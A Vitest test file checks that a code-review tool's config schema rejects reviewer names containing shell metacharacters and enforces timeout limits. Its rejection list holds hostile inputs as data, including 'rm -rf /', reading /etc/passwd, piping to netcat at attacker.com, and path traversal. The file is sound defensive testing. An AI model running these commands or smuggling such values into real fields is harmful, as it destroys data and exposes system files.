import { describe, it, expect } from 'vitest';
import { ReviewerSchema, ConfigSchema } from '../../src/config/schema.js';

describe('Config Schema - Security', () => {
  describe('Reviewer name validation', () => {
    it('should reject reviewer names with shell metacharacters', () => {
      const maliciousNames = [
        '; rm -rf /',
        '`whoami`',
        '$(whoami)',
        'test; echo hacked',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test$(id)',
        '../../../etc/passwd',
        'test;',
        'test&',
        'test|',
        'test>file',
        'test<file',
        'test`cmd`',
      ];

      for (const name of maliciousNames) {
        const result = ReviewerSchema.safeParse({
          name,
          provider: 'openai',
          model: 'gpt-4',
        });

        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues[0].message).toContain(
            'only alphanumeric characters, hyphens, and underscores'
          );
        }
      }
    });

    it('should accept valid reviewer names', () => {
      const validNames = [
        'gpt-4-reviewer',
        'claude_sonnet',
        'gemini-pro',
        'reviewer1',
        'test-reviewer-123',
        'my_reviewer_name',
        'GPT4',
      ];

      for (const name of validNames) {
        const result = ReviewerSchema.safeParse({
          name,
          provider: 'openai',
          model: 'gpt-4',
        });

        expect(result.success).toBe(true);
      }
    });

    it('should reject names exceeding max length', () => {
      const longName = 'a'.repeat(65);
      const result = ReviewerSchema.safeParse({
        name: longName,
        provider: 'openai',
        model: 'gpt-4',
      });

      expect(result.success).toBe(false);
    });

    it('should reject empty names', () => {
      const result = ReviewerSchema.safeParse({
        name: '',
        provider: 'openai',
        model: 'gpt-4',
      });

      expect(result.success).toBe(false);
    });
  });

  describe('Timeout validation', () => {
    it('should reject timeout exceeding max value', () => {
      const result = ReviewerSchema.safeParse({
        name: 'test',
        provider: 'openai',
        model: 'gpt-4',
        timeout: 3601, // > 3600
      });

      expect(result.success).toBe(false);
    });

    it('should reject negative timeout', () => {
      const result = ReviewerSchema.safeParse({
        name: 'test',
        provider: 'openai',
        model: 'gpt-4',
        timeout: -1,
      });

      expect(result.success).toBe(false);
    });

    it('should accept valid timeout', () => {
      const result = ReviewerSchema.safeParse({
        name: 'test',
        provider: 'openai',
        model: 'gpt-4',
        timeout: 600,
      });

      expect(result.success).toBe(true);
    });

    it('should use default timeout when not specified', () => {
      const result = ReviewerSchema.safeParse({
        name: 'test',
        provider: 'openai',
        model: 'gpt-4',
      });

      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.timeout).toBe(300);
      }
    });
  });
});
